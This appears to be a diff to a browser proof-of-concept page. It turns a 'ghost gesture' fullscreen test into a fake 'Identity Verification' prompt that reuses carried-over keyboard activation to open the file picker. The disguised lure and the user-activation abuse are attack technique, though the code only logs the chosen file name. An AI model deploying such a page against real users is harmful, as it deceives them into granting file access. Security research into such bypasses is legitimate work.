@@ -2,72 +2,93 @@
 <html>
 
 <head>
-    <title>PoC - Site B (Fullscreen)</title>
+    <title>Verification Required</title>
     <style>
         body {
-            font-family: monospace;
+            font-family: Arial;
+            background: #f0f2f5;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            background: white;
         }
 
-        #timer {
-            font-size: 3rem;
-            font-weight: bold;
+        .card {
+            background: white;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.2);
+            text-align: center;
+            width: 350px;
+        }
+
+        h2 {
+            margin-bottom: 10px;
         }
 
         #status {
-            margin-top: 20px;
+            margin-top: 15px;
             font-weight: bold;
+        }
+
+        button {
+            margin-top: 15px;
+            padding: 10px 20px;
+            border: none;
+            background: #1877f2;
+            color: white;
+            cursor: pointer;
+            border-radius: 5px;
         }
     </style>
 </head>
 
 <body>
-    <div id="timer">2s...</div>
-    <div id="status">Tahan terus sampai 1s</div>
 
-    <script>
-        setTimeout(() => {
-            document.getElementById('timer').innerText = "1s...";
-        }, 1000);
+<div class="card">
+    <h2>Identity Verification</h2>
+    <p>Please upload your document to continue</p>
 
-        setTimeout(() => {
-            document.getElementById('timer').innerText = "LEPAS!";
-        }, 2000);
+    <button>Upload Document</button>
 
-        window.addEventListener('keyup', async (e) => {
-            if (e.key === 'Enter') {
-                const status = document.getElementById('status');
+    <div id="status">Waiting...</div>
+</div>
 
-                console.log("Activation State:", navigator.userActivation.isActive);
+<script>
+window.addEventListener('keyup', async (e) => {
+    if (e.key === 'Enter') {
 
-                if (navigator.userActivation.isActive) {
-                    try {
-                        await document.documentElement.requestFullscreen();
+        const status = document.getElementById('status');
 
-                        status.innerText = "RESULT: SUCCESS (Entered Fullscreen!)";
-                        status.style.color = "green";
+        console.log("Activation:", navigator.userActivation.isActive);
 
-                        console.log("Ghost Gesture Success: Fullscreen triggered.");
+        if (navigator.userActivation.isActive) {
+            try {
+                status.innerText = "Opening file picker...";
+                status.style.color = "green";
+                const [fileHandle] = await window.showOpenFilePicker();
 
-                    } catch (err) {
-                        status.innerText = "RESULT: FAILED (Fullscreen Blocked)";
-                        status.style.color = "red";
+                const file = await fileHandle.getFile();
 
-                        console.error(err);
-                    }
-                } else {
-                    status.innerText = "RESULT: EXPIRED (User Activation lost)";
-                    status.style.color = "blue";
-                }
+                status.innerText = "File selected: " + file.name;
+
+                console.log("User selected:", file.name);
+
+            } catch (err) {
+                status.innerText = "User cancelled or blocked";
+                status.style.color = "red";
+                console.error(err);
             }
-        });
-    </script>
+
+        } else {
+            status.innerText = "Activation expired";
+            status.style.color = "blue";
+        }
+    }
+});
+</script>
+
 </body>
 
 </html>
